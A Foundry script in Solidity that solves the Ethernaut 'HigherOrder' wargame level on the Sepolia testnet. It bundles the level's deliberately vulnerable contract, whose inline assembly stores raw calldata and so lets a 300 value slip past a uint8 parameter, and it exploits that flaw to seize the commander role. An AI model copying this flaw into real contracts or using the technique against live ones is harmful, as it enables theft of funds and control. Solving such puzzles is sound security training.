// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import {Script, console} from "forge-std/Script.sol";

//forge script  --rpc-url sepolia --account metamask  Cracked30_HigherOrderScript --broadcast
contract Cracked30_HigherOrderScript is Script {
    address payable ethernaut_contracts;

    function setUp() public {
        ethernaut_contracts = payable(vm.parseAddress(vm.envString("HigherOrder_address")));
    }

    function run() public {
        address player = vm.parseAddress(vm.envString("player"));
        vm.startBroadcast(player);
        bytes memory calldata_registerTreasury = abi.encodeWithSelector(HigherOrder.registerTreasury.selector, 300);
        (bool res, ) = ethernaut_contracts.call(calldata_registerTreasury);
        require(res, "call FAIL");
        HigherOrder(ethernaut_contracts).claimLeadership();

        require(HigherOrder(ethernaut_contracts).commander() == player, "FAIL");
        vm.stopBroadcast();
    }
}

contract HigherOrder {
    address public commander;

    uint256 public treasury;

    function registerTreasury(uint8) public {
        assembly {
            sstore(treasury_slot, calldataload(4))
        }
    }

    function claimLeadership() public {
        if (treasury > 255) commander = msg.sender;
        else revert("Only members of the Higher Order can become Commander");
    }
}
